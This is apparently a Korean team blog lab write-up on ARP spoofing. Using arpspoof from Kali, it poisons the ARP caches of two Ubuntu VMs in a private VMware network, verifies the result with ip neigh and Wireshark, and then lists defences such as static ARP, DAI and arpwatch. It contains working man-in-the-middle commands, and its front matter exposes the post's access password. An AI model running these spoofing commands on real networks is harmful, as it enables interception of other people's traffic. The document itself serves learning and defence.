---
title: "팀로그 네트워크 보안 2차시"
published: 2026-08-17
description: "Can you hear me?"
image: ""
tags:
  - TeamLog
category: "TeamLog"

protected: true
password: "I_Think_Linux_Is_Awesome"
---

# ARP  스푸핑 실습
## ARP
ARP는 같은 네트워크 안에서 IP 주소를 MAC 주소로 변환하기 위해 사용하는 프로토콜이다
예를 들어 같은 네트워크에 있는 192.168.81.137로 패킷을 보내려고 해도 실제 이더넷 통신에서는 상대방의 MAC 주소가 필요하다
이때 ARP를 이용해서 1**92.168.81.137의 MAC 주소가 뭥미?** 라고 물어보고 해당 IP를 가진 장치가 자신의 MAC 주소를 알려주는 방식이다
문제는 ARP에는 응답을 보낸 장치가 정말 해당 IP의 주인인지 확인하는 인증 과정이 없다는 점이다
게다가 먼저 요청하지 않은 ARP Reply가 들어오더라도 이를 받아들일 수 있기 때문에 공격자가 거짓 정보를 보내 ARP 캐시를 변경할 수 있다
## ARP Spoofing
ARP Spoofing은 이런 ARP의 특징을 이용하는 공격이다
공격자가 피해자에게 거짓 ARP Reply를 계속 보내 자신과 다른 호스트의 IP 주소를 연결하도록 만든다
쉽게 생각하면 공격자가 피해자에게
**저 IP의 MAC 주소는 내 MAC 주소야**
라고 계속 거짓말하는 것이다
피해자가 이 정보를 믿고 ARP 캐시에 저장하면 원래 다른 호스트로 보내야 할 프레임을 공격자에게 보내게 된다
양쪽 호스트를 모두 속이면 이런 구조가 만들어질 수 있다
```plain text
Ubuntu1
   ↓
 Kali
   ↓
Ubuntu2
```
공격자가 중간에 들어가게 되기 때문에 MITM 형태의 공격으로 이어질 수 있다
# 실습 환경
이번 실습은 VMware 내부에 Kali Linux 1대와 Ubuntu 2대를 구성해서 진행했다
```plain text
Kali Linux
공격자

IP
192.168.81.139

Interface
eth0

MAC
00:0c:29:04:a8:16
```
```plain text
Ubuntu1
피해자

IP
192.168.81.135

Interface
ens33

MAC
00:0c:29:80:98:fb
```
```plain text
Ubuntu2
통신 대상

IP
192.168.81.137

Interface
ens33

MAC
00:0c:29:1a:85:57
```
![](/notion/teamlog-2-104d2f64-4efc-494e-bf9c-59bbce04a7bc.png)
# 네트워크 확인
먼저 각 VM의 IP 주소를 확인했다
Ubuntu에서는
```bash
ip addr
```
Kali에서도 같은 명령어를 사용했다
확인해보니 Ubuntu1은 192.168.81.135, Ubuntu2는 192.168.81.137, Kali는 192.168.81.139를 사용하고 있었다
Ubuntu의 네트워크 인터페이스는 ens33이고 Kali는 eth0이었다
라우팅 정보도 확인했다
```bash
ip route
```
Ubuntu1의 경우  Ubuntu2 역시 같은 네트워크와 게이트웨이를 사용했다
세 VM이 모두 같은 서브넷에 있기 때문에 ARP를 사용해 서로의 MAC 주소를 찾을 수 있는 환경이다
![](/notion/teamlog-2-9037d9f0-9f53-4562-8c87-e35c33128d63.png)
![](/notion/teamlog-2-b54177d3-8a94-4268-9199-4387caec34c5.png)
# 공격 전 통신 확인
ARP Spoofing을 하기 전에 Ubuntu1과 Ubuntu2가 정상적으로 통신하는지 확인했다
Ubuntu1에서 Ubuntu2로
```bash
ping -c 3 192.168.81.137
```
Ubuntu2에서 Ubuntu1로
```bash
ping -c 3 192.168.81.135
```
를 실행했고 정상적으로 통신되는 것을 확인했다
이후 ARP 캐시도 확인했다
Ubuntu1에서는
```bash
ip neigh show 192.168.81.137
```
Ubuntu2에서는
```bash
ip neigh show 192.168.81.135
```
를 사용했다
공격 전에는 각 IP 주소와 실제 Ubuntu VM의 MAC 주소가 연결되어 있었다
Ubuntu2의 실제 MAC 주소는
```plain text
00:0c:29:1a:85:57
```
Ubuntu1의 실제 MAC 주소는
```plain text
00:0c:29:80:98:fb
```
이다
![](/notion/teamlog-2-cde580af-7d36-4666-bacb-5fcaf5050906.png)
# ARP Spoofing 실행
공격은 Kali Linux에서 arpspoof를 이용했다
양쪽 호스트 사이에 들어가기 위해 Ubuntu1과 Ubuntu2를 각각 속이는 ARP Reply를 전송했다
먼저 Ubuntu1에게 Ubuntu2의 IP가 Kali의 MAC 주소라고 알려줬다
```bash
sudo arpspoof -i eth0 -t 192.168.81.135 192.168.81.137
```
여기서
```plain text
-t 192.168.81.135
```
는 공격 대상인 Ubuntu1을 의미하고
마지막의
```plain text
192.168.81.137
```
은 공격자가 자신인 것처럼 위장할 IP 주소다
실제로 실행해보니 다음과 같은 ARP Reply가 계속 전송됐다
```plain text
arp reply 192.168.81.137 is-at 0:c:29:4:a8:16
```
여기에서 0\:c\:29:4\:a8\:16은 Kali의 MAC 주소다
즉 Ubuntu1에게 계속
```plain text
192.168.81.137의 MAC 주소는
00:0c:29:04:a8:16
```
이라고 거짓 정보를 보내는 것이다
반대쪽도 똑같이 속였다
```bash
sudo arpspoof -i eth0 -t 192.168.81.137 192.168.81.135
```
이번에는 Ubuntu2에게
```plain text
192.168.81.135의 MAC 주소는
00:0c:29:04:a8:16
```
이라고 알려준다
두 명령을 동시에 실행하니 Kali에서 양쪽 Ubuntu를 대상으로 ARP Reply가 계속 전송되는 것을 볼 수 있었다
![](/notion/teamlog-2-1339aa91-1c3c-4462-9389-f8314e7f4f37.png)
# 공격 결과 확인
ARP Spoofing에서 중요한 부분은 단순히 패킷을 보냈다는 것보다 피해자의 ARP 캐시가 실제로 변경되는지 확인하는 것이다
Ubuntu1에서는 다음 명령으로 확인할 수 있다
```bash
ip neigh show 192.168.81.137
```
정상 상태에서는 192.168.81.137이 Ubuntu2의 MAC 주소인
```plain text
00:0c:29:1a:85:57
```
과 연결되어 있다
ARP Spoofing이 적용된 상태에서는 이 값이 공격자인 Kali의 MAC 주소인
```plain text
00:0c:29:04:a8:16
```
으로 변경되는 것을 확인할 수 있다
![](/notion/teamlog-2-01ad200d-599d-4687-9334-88c1b861bb7c.png)
Ubuntu2에서도 같은 방식으로 확인할 수 있다
```bash
ip neigh show 192.168.81.135
```
원래 Ubuntu1의 MAC 주소인
```plain text
00:0c:29:80:98:fb
```
가 들어가 있어야 하지만 공격이 적용되면 Kali의 MAC 주소로 변경된다
![](/notion/teamlog-2-a3b89758-7e0a-4598-8771-f56345fbce55.png)
결국 IP 주소 자체는 Ubuntu1과 Ubuntu2 그대로인데 해당 IP와 연결된 MAC 주소만 공격자의 MAC 주소로 속게 되는 것이다
---
## 분석
이번에 arpspoof를 실행했을 때 한 번만 ARP Reply를 보내고 끝나는 것이 아니라 같은 내용이 계속 반복해서 전송됐다
처음에는 왜 계속 보내는지 궁금했는데 생각해보면 실제 호스트도 계속 ARP 통신을 하기 때문에 한 번만 거짓 정보를 보내면 나중에 정상 정보로 다시 바뀔 수 있다
그래서 공격자는 거짓 ARP Reply를 반복해서 보내 피해자의 ARP 캐시를 계속 오염시키는 방식으로 동작하는 것 같다
Wireshark에서 ARP 패킷을 확인할 때도 이런 반복적인 ARP Reply를 확인할 수 있다
**arp.opcode == 2 **필터를 사용하면 ARP 패킷만 볼 수 있다
![](/notion/teamlog-2-d02d106b-97fb-4130-9e87-8ec2dc4be3b5.png)
# ARP 스푸핑 방어
ARP 스푸핑이 가능한 가장 큰 이유는 ARP 자체에 인증 기능이 없기 때문이다
받은 ARP Reply가 진짜 해당 IP를 가진 장치에서 온 것인지 확인하지 않고 캐시에 저장한다
찾아보니 중요한 시스템에서는 IP와 MAC 주소의 관계를 정적으로 지정하는 Static ARP를 사용할 수 있다
또 스위치에서는 DHCP Snooping 정보를 이용해 잘못된 ARP 패킷을 차단하는 DAI 같은 방법도 사용할 수 있다
arpwatch처럼 ARP 테이블의 변화를 감시해서 IP와 MAC 주소 관계가 갑자기 변경되는 것을 탐지하는 방법도 있다
